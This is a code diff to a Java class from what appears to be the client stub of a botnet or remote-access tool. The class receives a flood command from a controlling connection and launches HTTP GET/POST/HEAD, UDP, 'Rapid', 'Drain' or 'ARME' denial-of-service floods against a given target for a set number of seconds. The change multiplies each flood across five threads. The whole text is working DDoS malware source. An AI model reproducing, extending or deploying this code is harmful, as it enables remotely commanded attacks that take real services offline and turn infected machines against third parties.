@@ -11,30 +11,39 @@ import com.redpois0n.stub.flood.ThreadFlood;
 import com.redpois0n.stub.flood.UDP;
 
 public class Packet22Flood extends AbstractIncomingPacket {
+	
+	public static final int THREADS = 5;
 
 	@Override
 	public void read() throws Exception {
 		int method = Connection.readInt();
 		String target = Connection.readLine();
 		int seconds = Connection.readInt();
-		
-		new ThreadFlood(seconds).start();
-				
+					
 		if (method == Flood.GET.getNumeric()) {
-			new HTTP(target, Constants.HTTP_GET).start();
+			start(new HTTP(target, Constants.HTTP_GET), seconds);
 		} else if (method == Flood.POST.getNumeric()) {
-			new HTTP(target, Constants.HTTP_POST).start();
+			start(new HTTP(target, Constants.HTTP_POST), seconds);
 		} else if (method == Flood.HEAD.getNumeric()) {
-			new HTTP(target, Constants.HTTP_HEAD).start();
+			start(new HTTP(target, Constants.HTTP_HEAD), seconds);
 		} else if (method == Flood.UDP.getNumeric()) {
-			new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
+			start(new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
 		} else if (method == Flood.RAPID.getNumeric()) {
-			new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
+			start(new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
 		} else if (method == Flood.DRAIN.getNumeric()) {
-			new Drain(target).start();
+			start(new Drain(target), seconds);
 		} else if (method == Flood.ARME.getNumeric()) {
-			new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
+			start(new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
 		}
+	}
+	
+	public static void start(Runnable flood, int seconds) {
+		new Thread(new ThreadFlood(seconds)).start();
+		
+		for (int i = 0; i < THREADS; i++) {
+			new Thread(flood).start();
+		}
+
 	}
 
 }
